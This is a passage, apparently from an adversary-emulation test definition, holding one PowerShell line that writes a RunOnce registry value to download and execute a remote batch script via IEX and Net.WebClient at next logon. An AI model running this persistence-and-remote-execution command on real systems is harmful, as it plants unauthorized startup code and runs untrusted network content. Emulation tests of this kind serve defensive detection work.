...
set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/ARTifacts/Misc/Discovery.bat`")"'
```
